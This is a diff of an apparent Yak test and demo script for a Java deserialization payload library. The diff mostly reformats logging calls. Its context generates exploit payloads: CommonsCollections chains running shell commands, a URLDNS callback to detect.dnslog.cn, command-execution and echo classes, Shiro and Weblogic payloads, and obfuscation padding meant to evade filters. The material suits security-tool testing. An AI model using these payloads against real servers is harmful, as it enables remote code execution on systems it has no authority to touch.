@@ -12,13 +12,14 @@
 // 准备工作目录
 // 关键词: 工作目录, /tmp/javatest, 交叉验证目录
 testCodeDir = "/tmp/javatest"
-demoDir = file.Join(os.Getwd(), "java-yso")
+currentDir = os.Getwd()~
+demoDir = file.Join(currentDir, "java-yso")
 
 // 创建测试目录
-os.MkdirAll(testCodeDir, 0755)
-os.MkdirAll(demoDir, 0755)
-yakit.Info("测试代码目录: %v", testCodeDir)
-yakit.Info("Demo保存目录: %v", demoDir)
+file.MkdirAll(testCodeDir)~
+file.MkdirAll(demoDir)~
+yakit.Info(sprintf("测试代码目录: %v", testCodeDir))
+yakit.Info(sprintf("Demo保存目录: %v", demoDir))
 
 // =============================================================================
 // 第一部分: YSO反序列化利用链生成与验证
@@ -37,13 +38,13 @@ println("\n1.1 CommonsCollections系列利用链")
 // 关键词: yso.GetCommonsCollections1JavaObject, CC1链, 命令执行
 cc1Obj = yso.GetCommonsCollections1JavaObject("whoami")~
 cc1Bytes = yso.ToBytes(cc1Obj)~
-yakit.Info("CC1链payload大小: %v bytes", len(cc1Bytes))
+yakit.Info(sprintf("CC1链payload大小: %v bytes", len(cc1Bytes)))
 
 // 保存CC1链到demo目录
 // 关键词: Payload保存, 文件导出, Demo生成
 cc1File = file.Join(demoDir, "cc1-whoami.ser")
 file.Save(cc1File, cc1Bytes)~
-yakit.Success("CC1链已保存: %v", cc1File)
+yakit.Success(sprintf("CC1链已保存: %v", cc1File))
 
 // 验证：解析刚生成的序列化数据
 // 关键词: 序列化验证, 解析验证, 交叉检查
@@ -57,7 +58,7 @@ cc5Obj = yso.GetCommonsCollections5JavaObject("hostname")~
 cc5Bytes = yso.ToBytes(cc5Obj)~
 cc5File = file.Join(demoDir, "cc5-hostname.ser")
 file.Save(cc5File, cc5Bytes)~
-yakit.Info("CC5链已保存: %v", cc5File)
+yakit.Info(sprintf("CC5链已保存: %v", cc5File))
 
 // CC6链
 // 关键词: yso.GetCommonsCollections6JavaObject, CC6链
@@ -65,7 +66,7 @@ cc6Obj = yso.GetCommonsCollections6JavaObject("uname -a")~
 cc6Bytes = yso.ToBytes(cc6Obj)~
 cc6File = file.Join(demoDir, "cc6-uname.ser")
 file.Save(cc6File, cc6Bytes)~
-yakit.Info("CC6链已保存: %v", cc6File)
+yakit.Info(sprintf("CC6链已保存: %v", cc6File))
 
 println("✓ CommonsCollections链生成与验证完成")
 
@@ -77,7 +78,7 @@ println("\n1.2 URLDNS链生成与验证")
 // 关键词: yso.GetURLDNSJavaObject, URLDNS链, DNS外带
 urldnsObj = yso.GetURLDNSJavaObject("detect.dnslog.cn")~
 urldnsBytes = yso.ToBytes(urldnsObj)~
-yakit.Info("URLDNS payload大小: %v bytes", len(urldnsBytes))
+yakit.Info(sprintf("URLDNS payload大小: %v bytes", len(urldnsBytes)))
 
 // 保存并验证
 urldnsFile = file.Join(demoDir, "urldns-detect.ser")
@@ -91,8 +92,8 @@ file.Save(urldnsJsonFile, urldnsJson)~
 yakit.Success("URLDNS链已保存为.ser和.json格式")
 
 // 从JSON还原验证
-// 关键词: yso.FromJson, JSON还原, 序列化重建
-restoredObjs = yso.FromJson(urldnsJson)~
+// 关键词: java.FromJson, JSON还原, 序列化重建
+restoredObjs = java.FromJson(urldnsJson)~
 assert len(restoredObjs) > 0, "应该能从JSON还原对象"
 restoredBytes = yso.ToBytes(restoredObjs[0])~
 assert len(restoredBytes) > 0, "还原的对象应该能序列化"
@@ -137,13 +138,13 @@ runtimeExecClass = yso.GenerateRuntimeExecEvilClassObject(
     yso.majorVersion(52), // Java 8
 )~
 runtimeBytes = yso.ToBytes(runtimeExecClass)~
-yakit.Info("RuntimeExec类大小: %v bytes", len(runtimeBytes))
+yakit.Info(sprintf("RuntimeExec类大小: %v bytes", len(runtimeBytes)))
 
 // 保存到/tmp/javatest
 // 关键词: 字节码保存, Class文件, 测试文件
 runtimeClassFile = file.Join(testCodeDir, "RuntimeExecEvil.class")
 file.Save(runtimeClassFile, runtimeBytes)~
-yakit.Success("RuntimeExec类已保存: %v", runtimeClassFile)
+yakit.Success(sprintf("RuntimeExec类已保存: %v", runtimeClassFile))
 
 // 验证Magic Number
 // 关键词: Magic验证, 0xCAFEBABE, 字节码验证
@@ -159,7 +160,7 @@ pbExecClass = yso.GenerateProcessBuilderExecEvilClassObject(
 )~
 pbClassFile = file.Join(testCodeDir, "PBExecEvil.class")
 file.Save(pbClassFile, yso.ToBytes(pbExecClass)~)~
-yakit.Info("ProcessBuilder类已保存: %v", pbClassFile)
+yakit.Info(sprintf("ProcessBuilder类已保存: %v", pbClassFile))
 
 println("✓ 命令执行类生成与验证完成")
 
@@ -175,7 +176,7 @@ dnslogClass = yso.GenerateDNSlogEvilClassObject(
 dnslogBytes = yso.ToBytes(dnslogClass)~
 dnslogClassFile = file.Join(testCodeDir, "DNSLogEvil.class")
 file.Save(dnslogClassFile, dnslogBytes)~
-yakit.Success("DNSLog类已保存: %v", dnslogClassFile)
+yakit.Success(sprintf("DNSLog类已保存: %v", dnslogClassFile))
 
 // 同时保存到demo目录
 file.Save(file.Join(demoDir, "DNSLogEvil.class"), dnslogBytes)~
@@ -193,7 +194,7 @@ tomcatEcho = yso.GenerateTomcatEchoClassObject(
 )~
 tomcatEchoFile = file.Join(testCodeDir, "TomcatEchoEvil.class")
 file.Save(tomcatEchoFile, yso.ToBytes(tomcatEcho)~)~
-yakit.Info("Tomcat回显类已保存: %v", tomcatEchoFile)
+yakit.Info(sprintf("Tomcat回显类已保存: %v", tomcatEchoFile))
 
 // Spring回显类
 springEcho = yso.GenerateSpringEchoEvilClassObject(
@@ -202,7 +203,7 @@ springEcho = yso.GenerateSpringEchoEvilClassObject(
 )~
 springEchoFile = file.Join(testCodeDir, "SpringEchoEvil.class")
 file.Save(springEchoFile, yso.ToBytes(springEcho)~)~
-yakit.Info("Spring回显类已保存: %v", springEchoFile)
+yakit.Info(sprintf("Spring回显类已保存: %v", springEchoFile))
 
 println("✓ 回显类生成完成")
 
@@ -216,7 +217,7 @@ sleepClass = yso.GenerateSleepClassObject(
 )~
 sleepClassFile = file.Join(testCodeDir, "SleepEvil.class")
 file.Save(sleepClassFile, yso.ToBytes(sleepClass)~)~
-yakit.Success("Sleep类已保存: %v", sleepClassFile)
+yakit.Success(sprintf("Sleep类已保存: %v", sleepClassFile))
 
 println("✓ 延时检测类生成完成")
 
@@ -235,13 +236,13 @@ println("\n3.1 字节码加载验证")
 
 // 读取刚才保存的类文件
 savedBytes = file.ReadFile(runtimeClassFile)~
-yakit.Info("读取字节码文件: %v bytes", len(savedBytes))
+yakit.Info(sprintf("读取字节码文件: %v bytes", len(savedBytes)))
 
 // 从字节码加载
 loadedClass = yso.LoadClassFromBytes(savedBytes)~
-yakit.Info("类名: %v", loadedClass.ThisClassVerbose)
-yakit.Info("Magic: 0x%X", loadedClass.Magic)
-yakit.Info("Java版本: %v", loadedClass.MajorVersion)
+yakit.Info(sprintf("类名: %v", loadedClass.ThisClassVerbose))
+yakit.Info(sprintf("Magic: 0x%X", loadedClass.Magic))
+yakit.Info(sprintf("Java版本: %v", loadedClass.MajorVersion))
 
 assert loadedClass.Magic == 0xCAFEBABE, "Magic应该是0xCAFEBABE"
 assert loadedClass.MajorVersion == 52, "Java版本应该是52(Java 8)"
@@ -253,13 +254,13 @@ println("\n3.2 BCEL编码转换验证")
 
 // 转为BCEL格式
 bcelStr = yso.ToBcel(loadedClass)~
-yakit.Info("BCEL编码长度: %v", len(bcelStr))
+yakit.Info(sprintf("BCEL编码长度: %v", len(bcelStr)))
 yakit.Text(sprintf("BCEL示例: %v...", bcelStr[:min(100, len(bcelStr))]))
 
 // 保存BCEL编码
 bcelFile = file.Join(demoDir, "RuntimeExecEvil.bcel")
 file.Save(bcelFile, bcelStr)~
-yakit.Success("BCEL编码已保存: %v", bcelFile)
+yakit.Success(sprintf("BCEL编码已保存: %v", bcelFile))
 
 // 从BCEL还原
 bcelLoaded = yso.LoadClassFromBCEL(bcelStr)~
@@ -271,7 +272,7 @@ yakit.Success("BCEL编码转换验证通过")
 println("\n3.3 Base64编码验证")
 
 base64Bytes = codec.EncodeBase64(savedBytes)
-yakit.Info("Base64编码长度: %v", len(base64Bytes))
+yakit.Info(sprintf("Base64编码长度: %v", len(base64Bytes)))
 
 // 保存Base64
 base64File = file.Join(demoDir, "RuntimeExecEvil.base64")
@@ -304,25 +305,25 @@ testPayloadObj = yso.GetCommonsCollections6JavaObject("test")~
 bytesPayload = yso.ToBytes(testPayloadObj)~
 bytesFile = file.Join(demoDir, "test-payload.ser")
 file.Save(bytesFile, bytesPayload)~
-yakit.Info("Bytes格式: %v", bytesFile)
+yakit.Info(sprintf("Bytes格式: %v", bytesFile))
 
 // Hex格式
 hexPayload = codec.EncodeToHex(bytesPayload)
 hexFile = file.Join(demoDir, "test-payload.hex")
 file.Save(hexFile, hexPayload)~
-yakit.Info("Hex格式: %v", hexFile)
+yakit.Info(sprintf("Hex格式: %v", hexFile))
 
 // Base64格式
 base64Payload = codec.EncodeBase64(bytesPayload)
 base64PayloadFile = file.Join(demoDir, "test-payload.base64")
 file.Save(base64PayloadFile, base64Payload)~
-yakit.Info("Base64格式: %v", base64PayloadFile)
+yakit.Info(sprintf("Base64格式: %v", base64PayloadFile))
 
 // JSON格式
 jsonPayload = yso.ToJson(testPayloadObj)~
 jsonFile = file.Join(demoDir, "test-payload.json")
 file.Save(jsonFile, jsonPayload)~
-yakit.Info("JSON格式: %v", jsonFile)
+yakit.Info(sprintf("JSON格式: %v", jsonFile))
 
 yakit.Success("多格式Payload生成完成")
 
@@ -333,17 +334,17 @@ println("\n4.2 解析验证")
 // 从Bytes解析
 bytesP = java.ParseJavaObjectStream(bytesPayload)~
 assert len(bytesP) > 0, "Bytes格式应该能解析"
-yakit.Info("Bytes解析: %v个对象", len(bytesP))
+yakit.Info(sprintf("Bytes解析: %v个对象", len(bytesP)))
 
 // 从Hex解析
 hexParsed = java.ParseHexJavaObjectStream(hexPayload)~
 assert len(hexParsed) > 0, "Hex格式应该能解析"
-yakit.Info("Hex解析: %v个对象", len(hexParsed))
+yakit.Info(sprintf("Hex解析: %v个对象", len(hexParsed)))
 
 // 从JSON还原
-jsonRestored = yso.FromJson(jsonPayload)~
+jsonRestored = java.FromJson(jsonPayload)~
 assert len(jsonRestored) > 0, "JSON应该能还原"
-yakit.Info("JSON还原: %v个对象", len(jsonRestored))
+yakit.Info(sprintf("JSON还原: %v个对象", len(jsonRestored)))
 
 // 验证还原的对象能序列化
 jsonBytes = yso.ToBytes(jsonRestored[0])~
@@ -370,7 +371,7 @@ println("\n5.1 Shiro反序列化Payload生成")
 shiroDetect = yso.GetSimplePrincipalCollectionJavaObject()~
 shiroDetectBytes = yso.ToBytes(shiroDetect)~
 file.Save(file.Join(demoDir, "shiro-detect.ser"), shiroDetectBytes)~
-yakit.Info("Shiro检测payload: %v bytes", len(shiroDetectBytes))
+yakit.Info(sprintf("Shiro检测payload: %v bytes", len(shiroDetectBytes)))
 
 // 生成Shiro命令执行payload
 shiroCmdObj = yso.GetCommonsBeanutils183NOCCJavaObject(
@@ -389,7 +390,7 @@ shiroPayload = codec.EncodeBase64(append(iv, encrypted...))
 // 保存Shiro payload
 shiroFile = file.Join(demoDir, "shiro-exploit.txt")
 file.Save(shiroFile, shiroPayload)~
-yakit.Success("Shiro payload已保存: %v", shiroFile)
+yakit.Success(sprintf("Shiro payload已保存: %v", shiroFile))
 
 println("✓ Shiro场景验证完成")
 
@@ -401,7 +402,7 @@ weblogicObj = yso.GetCommonsCollections1JavaObject("calc")~
 weblogicBytes = yso.ToBytes(weblogicObj)~
 weblogicFile = file.Join(demoDir, "weblogic-t3.ser")
 file.Save(weblogicFile, weblogicBytes)~
-yakit.Success("Weblogic T3 payload已保存: %v", weblogicFile)
+yakit.Success(sprintf("Weblogic T3 payload已保存: %v", weblogicFile))
 
 println("✓ Weblogic场景验证完成")
 
@@ -419,7 +420,7 @@ println("=" * 80)
 println("\n6.1 Runtime Exec Gadget批量生成")
 
 runtimeGadgets = yso.GetAllRuntimeExecGadget()
-yakit.Info("获取到 %v 个RuntimeExec Gadget", len(runtimeGadgets))
+yakit.Info(sprintf("获取到 %v 个RuntimeExec Gadget", len(runtimeGadgets)))
 
 // 批量生成前5个Gadget
 testCmd = "whoami"
@@ -432,7 +433,7 @@ for i = 0; i < min(5, len(runtimeGadgets)); i++ {
     // 保存到demo目录
     fileName = sprintf("gadget-%02d-%v.ser", i+1, gadgetName)
     file.Save(file.Join(demoDir, fileName), bytes)~
-    yakit.Info("Gadget[%v] %v: %v bytes", i+1, gadgetName, len(bytes))
+    yakit.Info(sprintf("Gadget[%v] %v: %v bytes", i+1, gadgetName, len(bytes)))
 }
 
 yakit.Success("批量Gadget生成完成")
@@ -481,10 +482,10 @@ twoByteBytes = yso.ToBytes(obfGadget, yso.twoBytesCharString())~
 threeByteBytes = yso.ToBytes(obfGadget, yso.threeBytesCharString())~
 dirtyBytes = yso.ToBytes(obfGadget, yso.dirtyDataLength(1000))~
 
-yakit.Info("正常编码: %v bytes", len(normalBytes))
-yakit.Info("双字节编码: %v bytes", len(twoByteBytes))
-yakit.Info("三字节编码: %v bytes", len(threeByteBytes))
-yakit.Info("脏数据填充: %v bytes", len(dirtyBytes))
+yakit.Info(sprintf("正常编码: %v bytes", len(normalBytes)))
+yakit.Info(sprintf("双字节编码: %v bytes", len(twoByteBytes)))
+yakit.Info(sprintf("三字节编码: %v bytes", len(threeByteBytes)))
+yakit.Info(sprintf("脏数据填充: %v bytes", len(dirtyBytes)))
 
 // 保存混淆样本
 file.Save(file.Join(demoDir, "obf-normal.ser"), normalBytes)~
